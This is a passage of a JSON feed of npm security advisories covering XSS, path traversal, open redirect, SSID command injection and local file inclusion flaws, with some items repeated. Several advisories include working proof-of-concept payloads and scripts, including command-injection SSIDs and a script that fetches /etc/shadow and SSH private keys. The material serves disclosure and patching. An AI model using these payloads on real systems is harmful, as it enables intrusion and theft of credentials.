{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<p>The Trix editor, versions prior to 2.1.11, is vulnerable to XSS when pasting malicious code in the link field.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker could trick the user to copy&amp;paste a malicious <code>javascript:</code> URL as a link that would execute arbitrary JavaScript code within the context of the user's session, potentially leading to unauthorized actions being performed or sensitive information being disclosed.</p>\n<p>See <a href=\"https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8\">https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8</a></p>\n<h3 id=\"patches\">Patches</h3>\n<p>Update Recommendation: Users should upgrade to Trix editor version 2.1.12 or later.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>This is not really a workaround but something that should be considered in addition to upgrading to the patched version. If affected users can disallow browsers that don't support a Content Security Policy, then this would be an effective workaround for this and all XSS vulnerabilities. Set CSP policies such as script-src 'self' to ensure that only scripts hosted on the same origin are executed, and explicitly prohibit inline scripts using script-src-elem.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8\">https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8</a></p>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was reported by Hackerone researcher <a href=\"https://hackerone.com/lio346?type=user\">https://hackerone.com/lio346?type=user</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/basecamp/trix/security/advisories/GHSA-j386-3444-qgwg\">https://github.com/basecamp/trix/security/advisories/GHSA-j386-3444-qgwg</a></li>\n<li><a href=\"https://github.com/basecamp/trix/commit/180c8d337f18e1569cea6ef29b4d03ffff5b5faa\">https://github.com/basecamp/trix/commit/180c8d337f18e1569cea6ef29b4d03ffff5b5faa</a></li>\n<li><a href=\"https://github.com/basecamp/trix/commit/c4f0d6f80654603932af6685694f694e96593b93\">https://github.com/basecamp/trix/commit/c4f0d6f80654603932af6685694f694e96593b93</a></li>\n<li><a href=\"https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8\">https://gist.github.com/th4s1s/3921fd9c3e324ad9a3e0d846166e3eb8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-21610\">https://nvd.nist.gov/vuln/detail/CVE-2025-21610</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j386-3444-qgwg\">https://github.com/advisories/GHSA-j386-3444-qgwg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j386-3444-qgwg",
            "title": "[trix] Trix allows Cross-site Scripting via `javascript:` url in a link",
            "date_modified": "2025-01-03T19:26:15.000Z",
            "date_published": "2025-01-03T16:29:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j386-3444-qgwg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This is a POC for a path-sanitizer <a href=\"https://www.npmjs.com/package/path-sanitizer\">npm package</a>. The filters can be bypassed and can result in path traversal.</p>\n<p>Payload: <code>..=%5c</code> can be used to bypass this on CLI (along with other candidates). Something similar would likely work on web apps as well. </p>\n<h3 id=\"poc\">PoC</h3>\n<p>Here's the code to test for the filter bypass:</p>\n<pre><code class=\"language-js\">const sanitize = require(\"path-sanitizer\")\nconst path = require(\"path\")\nconst fs = require(\"fs\")\n\n// Real scenario:\nfunction routeHandler(myPath) {\n  // Lets just assume that the path was extracted from the request\n  // We want to read a file in the C:\\Users\\user\\Desktop\\myApp\\ directory\n  // But the user should be able to access C:\\Users\\user\\Desktop\\\n  // So we need to sanitize the path\n\n  const APP_DIR = \"/var/hacker\"\n  const sanitized = path.join(APP_DIR, sanitize(myPath))\n\n  // Now we would usally read the file\n  // But in this case we just gonna print the path\n  // console.log(sanitized)\n  return sanitized\n}\n\nfunction readFile(filePath) {\n  const absolutePath = path.resolve(filePath) // Resolve to absolute path\n\n  fs.readFile(absolutePath, \"utf8\", (err, data) =&gt; {\n    if (err) {\n      console.error(`Error reading the file: ${err.message}`)\n      return\n    }\n    console.log(`Contents of the file ${filePath} :\\n${data}`)\n  })\n}\n\ninput_user_bypass = \"..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5ctmp/hacked.txt\"\n// input_user_bypass = \"..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5cetc/passwd\"\ninput_user_payload = \"../../../../../../../../tmp/hacked.txt\"\n\nreadFile(routeHandler(input_user_bypass))\nreadFile(routeHandler(input_user_payload))\n</code></pre>\n<p>Here is a video POC: (this is a Loom POC, only users with the UUID of the video can see it) </p>\n<p><a href=\"https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d\">https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d</a></p>\n<h3 id=\"impact\">Impact</h3>\n<p>Any CLI tool or library using this package can be/will be vulnerable to Path traversal.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cabraviva/path-sanitizer/security/advisories/GHSA-94p5-r7cc-3rpr\">https://github.com/cabraviva/path-sanitizer/security/advisories/GHSA-94p5-r7cc-3rpr</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56198\">https://nvd.nist.gov/vuln/detail/CVE-2024-56198</a></li>\n<li><a href=\"https://github.com/cabraviva/path-sanitizer/commit/b6d2319eac910dffdfacc8460f5b5cc5a1518ead\">https://github.com/cabraviva/path-sanitizer/commit/b6d2319eac910dffdfacc8460f5b5cc5a1518ead</a></li>\n<li><a href=\"https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d\">https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-94p5-r7cc-3rpr\">https://github.com/advisories/GHSA-94p5-r7cc-3rpr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-94p5-r7cc-3rpr",
            "title": "[path-sanitizer] path-sanitizer allows bypassing the existing filters to achieve path-traversal vulnerability ",
            "date_modified": "2025-01-02T12:52:43.000Z",
            "date_published": "2025-01-02T12:52:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-94p5-r7cc-3rpr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>An <strong>open redirect vulnerability</strong> has been identified in the <strong>verify email endpoint</strong> of Better Auth, potentially allowing attackers to redirect users to malicious websites. This issue affects users relying on email verification links generated by the library.</p>\n<h2 id=\"affected-versions\">Affected Versions</h2>\n<ul>\n<li>All versions prior to <strong>v1.1.6</strong>.</li>\n</ul>\n<h2 id=\"impact\">Impact</h2>\n<p>Attackers could craft malicious email verification links that exploit the redirect functionality to send users to untrusted domains. This can result in:</p>\n<ul>\n<li><strong>Phishing attacks</strong> – Users may unknowingly enter sensitive information on fake login pages.</li>\n<li><strong>Reputation damage</strong> – Trust issues for applications using Better Auth.</li>\n</ul>\n<h2 id=\"vulnerability-details\">Vulnerability Details</h2>\n<p>The verify email callback endpoint accepts a <code>callbackURL</code> parameter. Unlike other verification methods, email verification only uses JWT to verify and redirect without proper validation of the target domain. The origin checker is bypassed in this scenario because it only checks for <code>POST</code> requests. An attacker can manipulate this parameter to redirect users to arbitrary URLs controlled by the attacker.</p>\n<p><strong>Example Exploit:</strong></p>\n<pre><code>https://example.com/auth/verify-email?token=abcd1234&amp;callbackURL=https://malicious-site.com\n</code></pre>\n<h2 id=\"patches\">Patches</h2>\n<p>Upgrade to Better Auth <strong>v1.1.6</strong> or later. This version enforces domain validation for <code>callbackURL</code> for <code>/verify-email</code> path and for all other <code>GET</code> endpoints.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>You can also use hooks to pre-check URLs in your auth instance to prevent this without upgrading:</p>\n<pre><code class=\"language-ts\">const auth = betterAuth({\n    hooks: {\n         before: (ctx) =&gt; {\n            if (ctx.path === \"/verify-email\") {\n               const callbackURL = ctx.query.callbackURL; // Check if this is a trusted callback URL or not\n            }\n         }\n    }\n})\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/better-auth/better-auth/security/advisories/GHSA-8jhw-6pjj-8723\">https://github.com/better-auth/better-auth/security/advisories/GHSA-8jhw-6pjj-8723</a></li>\n<li><a href=\"https://github.com/better-auth/better-auth/commit/deb3d73aea90d0468d92723f4511542b593e522f\">https://github.com/better-auth/better-auth/commit/deb3d73aea90d0468d92723f4511542b593e522f</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56734\">https://nvd.nist.gov/vuln/detail/CVE-2024-56734</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8jhw-6pjj-8723\">https://github.com/advisories/GHSA-8jhw-6pjj-8723</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8jhw-6pjj-8723",
            "title": "[better-auth] Better Auth has an Open Redirect Vulnerability in Verify Email Endpoint",
            "date_modified": "2024-12-30T18:45:18.000Z",
            "date_published": "2024-12-30T16:49:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8jhw-6pjj-8723"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Marp Core (<a href=\"https://www.npmjs.com/package/@marp-team/marp-core\"><code>@marp-team/marp-core</code></a>) from v3.0.2 to v3.9.0 and v4.0.0, are vulnerable to cross-site scripting (XSS)  due to improper neutralization of HTML sanitization.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Marp Core includes an HTML sanitizer with allowlist support. In the affected versions, the built-in allowlist is enabled by default. When the allowlist is active, if insufficient HTML comments are included, the sanitizer may fail to properly sanitize HTML content and lead cross-site scripting (XSS).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Marp Core <a href=\"https://github.com/marp-team/marp-core/releases/tag/v3.9.1\">v3.9.1</a> and <a href=\"https://github.com/marp-team/marp-core/releases/tag/v4.0.1\">v4.0.1</a> have been patched to fix that.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you are unable to update the package immediately, disable all HTML tags by setting <code>html: false</code> option in the <code>Marp</code> class constructor.</p>\n<pre><code class=\"language-javascript\">const marp = new Marp({ html: false })\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\n<li><a href=\"https://github.com/marp-team/marp-core/pull/282\">https://github.com/marp-team/marp-core/pull/282</a></li>\n<li><a href=\"https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49\">https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49</a></li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to @Ry0taK for finding out this vulnerability.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/marp-team/marp-core/security/advisories/GHSA-x52f-h5g4-8qv5\">https://github.com/marp-team/marp-core/security/advisories/GHSA-x52f-h5g4-8qv5</a></li>\n<li><a href=\"https://github.com/marp-team/marp-core/pull/282\">https://github.com/marp-team/marp-core/pull/282</a></li>\n<li><a href=\"https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49\">https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49</a></li>\n<li><a href=\"https://github.com/marp-team/marp-core/releases/tag/v3.9.1\">https://github.com/marp-team/marp-core/releases/tag/v3.9.1</a></li>\n<li><a href=\"https://github.com/marp-team/marp-core/releases/tag/v4.0.1\">https://github.com/marp-team/marp-core/releases/tag/v4.0.1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56510\">https://nvd.nist.gov/vuln/detail/CVE-2024-56510</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x52f-h5g4-8qv5\">https://github.com/advisories/GHSA-x52f-h5g4-8qv5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x52f-h5g4-8qv5",
            "title": "[@marp-team/marp-core] Marp Core allows XSS by improper neutralization of HTML sanitization",
            "date_modified": "2024-12-26T21:46:03.000Z",
            "date_published": "2024-12-26T18:25:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x52f-h5g4-8qv5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Marp Core (<a href=\"https://www.npmjs.com/package/@marp-team/marp-core\"><code>@marp-team/marp-core</code></a>) from v3.0.2 to v3.9.0 and v4.0.0, are vulnerable to cross-site scripting (XSS)  due to improper neutralization of HTML sanitization.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Marp Core includes an HTML sanitizer with allowlist support. In the affected versions, the built-in allowlist is enabled by default. When the allowlist is active, if insufficient HTML comments are included, the sanitizer may fail to properly sanitize HTML content and lead cross-site scripting (XSS).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Marp Core <a href=\"https://github.com/marp-team/marp-core/releases/tag/v3.9.1\">v3.9.1</a> and <a href=\"https://github.com/marp-team/marp-core/releases/tag/v4.0.1\">v4.0.1</a> have been patched to fix that.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you are unable to update the package immediately, disable all HTML tags by setting <code>html: false</code> option in the <code>Marp</code> class constructor.</p>\n<pre><code class=\"language-javascript\">const marp = new Marp({ html: false })\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\n<li><a href=\"https://github.com/marp-team/marp-core/pull/282\">https://github.com/marp-team/marp-core/pull/282</a></li>\n<li><a href=\"https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49\">https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49</a></li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to @Ry0taK for finding out this vulnerability.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/marp-team/marp-core/security/advisories/GHSA-x52f-h5g4-8qv5\">https://github.com/marp-team/marp-core/security/advisories/GHSA-x52f-h5g4-8qv5</a></li>\n<li><a href=\"https://github.com/marp-team/marp-core/pull/282\">https://github.com/marp-team/marp-core/pull/282</a></li>\n<li><a href=\"https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49\">https://github.com/marp-team/marp-core/commit/61a1def244d1b6faa8e2c0be97ec0b68cab3ab49</a></li>\n<li><a href=\"https://github.com/marp-team/marp-core/releases/tag/v3.9.1\">https://github.com/marp-team/marp-core/releases/tag/v3.9.1</a></li>\n<li><a href=\"https://github.com/marp-team/marp-core/releases/tag/v4.0.1\">https://github.com/marp-team/marp-core/releases/tag/v4.0.1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56510\">https://nvd.nist.gov/vuln/detail/CVE-2024-56510</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x52f-h5g4-8qv5\">https://github.com/advisories/GHSA-x52f-h5g4-8qv5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x52f-h5g4-8qv5",
            "title": "[@marp-team/marp-core] Marp Core allows XSS by improper neutralization of HTML sanitization",
            "date_modified": "2024-12-26T21:46:03.000Z",
            "date_published": "2024-12-26T18:25:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x52f-h5g4-8qv5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The SSID is not sanitized when before it is passed as a parameter to cmd.exe in the <code>getWindowsIEEE8021x</code> function. This means that malicious content in the SSID can be executed as OS commands. </p>\n<h3 id=\"details\">Details</h3>\n<p>I have exploited this vulnerability in a Windows service using version 5.22.11 of the module, to escalate privileges (in an environment where I am authorized to do so). However, as far as I can see from the code, it is still present in master branch at time of writing, on line <a href=\"https://github.com/sebhildebrandt/systeminformation/blob/3a92931c7d46605ffddc1aacb97a9727273b2888/lib/network.js#L403\">403/404 of network.js</a>.</p>\n<p>The SSID is obtained from <code>netsh wlan show interface ...</code> in <code>getWindowsWirelessIfaceSSID</code>, and then passed to <code>cmd.exe /d /s /c \"netsh wlan show profiles ...</code> in <code>getWindowsIEEE8021x</code>, without sanitization.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>First, the command injection payload should be included in the connected Wi-Fi SSID. For example create hotspot on mobile phone or other laptop, set SSID to payload, connect to it with victim Windows system. Two example SSID's to demonstrate exploitation are below.</p>\n<p>Demonstration to run ping command indefinitely:</p>\n<pre><code>a\" | ping /t 127.0.0.1 &amp;\n</code></pre>\n<p>Run executable with privileges of the user in which vulnerable function is executed. Chosen executable should should be placed in (assuming system drive is C): <code>C:\\a\\a.exe</code>.</p>\n<pre><code>a\" | %SystemDrive%\\a\\a.exe &amp;\n</code></pre>\n<p>Then, the vulnerable function can be executed on the victim system, for example, using:</p>\n<pre><code>const si = require('systeminformation');\nsi.networkInterfaces((net) =&gt; { console.log(net) });\n</code></pre>\n<p>Now the chosen command, <code>PING.exe</code> or <code>a.exe</code> will be run through the cmd.exe command line.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability may enable an attacker, depending on how the package is used, to perform remote code execution or local privilege escalation.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-cvv5-9h9w-qp2m\">https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-cvv5-9h9w-qp2m</a></li>\n<li><a href=\"https://github.com/sebhildebrandt/systeminformation/commit/f7af0a67b78e7894335a6cad510566a25e06ae41\">https://github.com/sebhildebrandt/systeminformation/commit/f7af0a67b78e7894335a6cad510566a25e06ae41</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56334\">https://nvd.nist.gov/vuln/detail/CVE-2024-56334</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cvv5-9h9w-qp2m\">https://github.com/advisories/GHSA-cvv5-9h9w-qp2m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cvv5-9h9w-qp2m",
            "title": "[systeminformation] Systeminformation has command injection vulnerability in getWindowsIEEE8021x (SSID)",
            "date_modified": "2024-12-20T21:37:02.000Z",
            "date_published": "2024-12-20T19:13:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cvv5-9h9w-qp2m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An <strong>Improper URL Handling Vulnerability</strong> allows an attacker to access sensitive local files on the server by exploiting the <code>file:///</code> protocol. This vulnerability is triggered via the <strong>\"real-browser\"</strong> request type, which takes a screenshot of the URL provided by the attacker. By supplying local file paths, such as <code>file:///etc/passwd</code>, an attacker can read sensitive data from the server.</p>\n<h3 id=\"details\">Details</h3>\n<p>The vulnerability arises because the system does not properly validate or sanitize the user input for the URL field. Specifically:</p>\n<ol>\n<li><p>The URL input (<code>&lt;input data-v-5f5c86d7=\"\" id=\"url\" type=\"url\" class=\"form-control\" pattern=\"https?://.+\" required=\"\"&gt;</code>) allows users to input arbitrary file paths, including those using the <code>file:///</code> protocol, without server-side validation.</p>\n</li>\n<li><p>The server then uses the user-provided URL to make a request, passing it to a browser instance that performs the \"real-browser\" request, which takes a screenshot of the content at the given URL. If a local file path is entered (e.g., <code>file:///etc/passwd</code>), the browser fetches and captures the file’s content.</p>\n</li>\n</ol>\n<pre><code class=\"language-javascript\">const browser = await getBrowser();\nconst context = await browser.newContext();\nconst page = await context.newPage();\n\nconst res = await page.goto(monitor.url, {\n    waitUntil: \"networkidle\",\n    timeout: monitor.interval * 1000 * 0.8,\n});\n\nlet filename = jwt.sign(monitor.id, server.jwtSecret) + \".png\";\n\nawait page.screenshot({\n    path: path.join(Database.screenshotDir, filename),\n});\n\nawait context.close();\n</code></pre>\n<p>Since the user input is not validated, an attacker can manipulate the URL to request local files (e.g., <code>file:///etc/passwd</code>), and the system will capture a screenshot of the file's content, potentially exposing sensitive data.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li><strong>Instructions</strong>:<ul>\n<li>Enter a local file path as the URL, such as: <code>view-source:file:///etc/passwd</code>.</li>\n<li>The server will process the URL and, in \"real-browser\" mode, capture a screenshot of the file content.</li>\n</ul>\n</li>\n</ol>\n<p>Example PoC:</p>\n<ol>\n<li>Log in to the application with valid credentials:</li>\n</ol>\n<pre><code class=\"language-javascript\">const { io } = require(\"socket.io-client\");\n\n// Server configuration and credentials\nconst CONFIG = {\n  serverUrl: \"ws://localhost:3001\",\n  credentials: {\n    username: \"admin\",\n    password: \"password1\"\n  },\n  requestType: {\n    REAL_BROWSER: \"real-browser\",\n    HTTP: \"http\"\n  },\n  urlHeader: {\n    VIEW_SOURCE: \"view-source:file:///\",\n    FILE: \"file:///\"\n  }\n};\n\n// List of sensitive files on a Linux system\nconst SENSITIVE_FILES = [\n  \"/etc/passwd\",\n  \"/etc/shadow\",\n  \"/etc/hosts\",\n  \"/etc/hostname\",\n  \"/etc/network/interfaces\", // May vary depending on the distribution\n  \"/etc/ssh/ssh_config\",\n  \"/etc/ssh/sshd_config\",\n  \"~/.ssh/authorized_keys\",\n  \"~/.ssh/id_rsa\",\n  \"/etc/ssl/private/*.key\",\n  \"/etc/ssl/certs/*.crt\",\n  \"/app/data/kuma.db\", // Uptime Kuma database file\n  \"/app/data/config.json\" // Uptime Kuma configuration file\n];\n\n// Function to send a request and wait for the response\nfunction sendRequest(socket, filePath, type) {\n  return new Promise((resolve, reject) =&gt; {\n    fileUrl = CONFIG.urlHeader.VIEW_SOURCE + filePath;\n    if (type == CONFIG.requestType.HTTP) {\n      fileUrl = CONFIG.urlHeader.FILE + filePath;\n    }\n    socket.emit(\"add\", {\n      type: type,\n      name: type + \" \" + filePath,\n      url: fileUrl,\n      method: \"GET\",\n      maxretries: 0,\n      timeout: 500,\n      notificationIDList: {},\n      ignoreTls: true,\n      upsideDown: false,\n      accepted_statuscodes: [\"200-299\"]\n    }, (res) =&gt; {\n      console.log(`Response for file ${filePath}:`, res);\n      resolve();\n    });\n  });\n}\n\n// Main function for connecting and sending the 'add' request\n(async () =&gt; {\n  const socket = io(CONFIG.serverUrl);\n\n  // Handle connection errors\n  socket.on(\"connect_error\", (err) =&gt; {\n    console.error(\"Connection failed:\", err.message);\n  });\n\n  try {\n    // Connecting with credentials\n    await new Promise((resolve, reject) =&gt; {\n      socket.emit(\"login\", {\n        username: CONFIG.credentials.username,\n        password: CONFIG.credentials.password,\n        token: \"\"\n      }, (res) =&gt; {\n        if (res.ok) {\n          console.log(\"Connection successful\");\n          resolve();\n        } else {\n          console.log(res);\n          reject(new Error(\"Connection failed\"));\n        }\n      });\n    });\n\n    // Sending requests for each file using Promise.all to ensure synchronization\n    const realBrowserRequests = SENSITIVE_FILES.map(filePath =&gt; sendRequest(socket, filePath, CONFIG.requestType.REAL_BROWSER));\n\n    // Wait for all requests to be sent\n    await Promise.all([...realBrowserRequests]);\n\n    // Close the socket after all requests have been sent\n    socket.close();\n    console.log(\"Connection closed after all requests.\");\n\n  } catch (error) {\n    console.error(\"Error:\", error.message);\n    socket.close();\n  }\n})();\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability is a <strong>Local File Inclusion (LFI)</strong> issue, which allows an attacker to access and potentially exfiltrate sensitive files from the server. The impact is significant, as attackers can access critical system files or application configuration files, such as:</p>\n<ul>\n<li><code>/etc/passwd</code>: Contains user account information.</li>\n<li><code>/etc/shadow</code>: Contains password hashes.</li>\n<li><code>/app/data/kuma.db</code>: Contains the database for the Uptime Kuma monitoring tool.</li>\n<li><code>/app/data/config.json</code>: Contains the database credentials for Uptime Kuma.</li>\n</ul>\n<p>Any <strong>authenticated user</strong> who can submit a URL in \"real-browser\" mode is at risk of exposing sensitive data through screenshots of these files.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/louislam/uptime-kuma/security/advisories/GHSA-2qgm-m29m-cj2h\">https://github.com/louislam/uptime-kuma/security/advisories/GHSA-2qgm-m29m-cj2h</a></li>\n<li><a href=\"https://github.com/louislam/uptime-kuma/commit/6cfae01a0d3727c517afe512fc8fec1d99acf875\">https://github.com/louislam/uptime-kuma/commit/6cfae01a0d3727c517afe512fc8fec1d99acf875</a></li>\n<li><a href=\"https://github.com/louislam/uptime-kuma/releases/tag/1.23.16\">https://github.com/louislam/uptime-kuma/releases/tag/1.23.16</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56331\">https://nvd.nist.gov/vuln/detail/CVE-2024-56331</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2qgm-m29m-cj2h\">https://github.com/advisories/GHSA-2qgm-m29m-cj2h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2qgm-m29m-cj2h",
            "title": "[uptime-kuma] uptime-kuma vulnerable to Local File Inclusion (LFI) via Improper URL Handling in `Real-Browser` monitor",
            "date_modified": "2024-12-20T21:36:57.000Z",
            "date_published": "2024-12-20T15:10:46.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2qgm-m29m-cj2h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An <strong>Improper URL Handling Vulnerability</strong> allows an attacker to access sensitive local files on the server by exploiting the <code>file:///</code> protocol. This vulnerability is triggered via the <strong>\"real-browser\"</strong> request type, which takes a screenshot of the URL provided by the attacker. By supplying local file paths, such as <code>file:///etc/passwd</code>, an attacker can read sensitive data from the server.</p>\n<h3 id=\"details\">Details</h3>\n<p>The vulnerability arises because the system does not properly validate or sanitize the user input for the URL field. Specifically:</p>\n<ol>\n<li><p>The URL input (<code>&lt;input data-v-5f5c86d7=\"\" id=\"url\" type=\"url\" class=\"form-control\" pattern=\"https?://.+\" required=\"\"&gt;</code>) allows users to input arbitrary file paths, including those using the <code>file:///</code> protocol, without server-side validation.</p>\n</li>\n<li><p>The server then uses the user-provided URL to make a request, passing it to a browser instance that performs the \"real-browser\" request, which takes a screenshot of the content at the given URL. If a local file path is entered (e.g., <code>file:///etc/passwd</code>), the browser fetches and captures the file’s content.</p>\n</li>\n</ol>\n<pre><code class=\"language-javascript\">const browser = await getBrowser();\nconst context = await browser.newContext();\nconst page = await context.newPage();\n\nconst res = await page.goto(monitor.url, {\n    waitUntil: \"networkidle\",\n    timeout: monitor.interval * 1000 * 0.8,\n});\n\nlet filename = jwt.sign(monitor.id, server.jwtSecret) + \".png\";\n\nawait page.screenshot({\n    path: path.join(Database.screenshotDir, filename),\n});\n\nawait context.close();\n</code></pre>\n<p>Since the user input is not validated, an attacker can manipulate the URL to request local files (e.g., <code>file:///etc/passwd</code>), and the system will capture a screenshot of the file's content, potentially exposing sensitive data.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li><strong>Instructions</strong>:<ul>\n<li>Enter a local file path as the URL, such as: <code>view-source:file:///etc/passwd</code>.</li>\n<li>The server will process the URL and, in \"real-browser\" mode, capture a screenshot of the file content.</li>\n</ul>\n</li>\n</ol>\n<p>Example PoC:</p>\n<ol>\n<li>Log in to the application with valid credentials:</li>\n</ol>\n<pre><code class=\"language-javascript\">const { io } = require(\"socket.io-client\");\n\n// Server configuration and credentials\nconst CONFIG = {\n  serverUrl: \"ws://localhost:3001\",\n  credentials: {\n    username: \"admin\",\n    password: \"password1\"\n  },\n  requestType: {\n    REAL_BROWSER: \"real-browser\",\n    HTTP: \"http\"\n  },\n  urlHeader: {\n    VIEW_SOURCE: \"view-source:file:///\",\n    FILE: \"file:///\"\n  }\n};\n\n// List of sensitive files on a Linux system\nconst SENSITIVE_FILES = [\n  \"/etc/passwd\",\n  \"/etc/shadow\",\n  \"/etc/hosts\",\n  \"/etc/hostname\",\n  \"/etc/network/interfaces\", // May vary depending on the distribution\n  \"/etc/ssh/ssh_config\",\n  \"/etc/ssh/sshd_config\",\n  \"~/.ssh/authorized_keys\",\n  \"~/.ssh/id_rsa\",\n  \"/etc/ssl/private/*.key\",\n  \"/etc/ssl/certs/*.crt\",\n  \"/app/data/kuma.db\", // Uptime Kuma database file\n  \"/app/data/config.json\" // Uptime Kuma configuration file\n];\n\n// Function to send a request and wait for the response\nfunction sendRequest(socket, filePath, type) {\n  return new Promise((resolve, reject) =&gt; {\n    fileUrl = CONFIG.urlHeader.VIEW_SOURCE + filePath;\n    if (type == CONFIG.requestType.HTTP) {\n      fileUrl = CONFIG.urlHeader.FILE + filePath;\n    }\n    socket.emit(\"add\", {\n      type: type,\n      name: type + \" \" + filePath,\n      url: fileUrl,\n      method: \"GET\",\n      maxretries: 0,\n      timeout: 500,\n      notificationIDList: 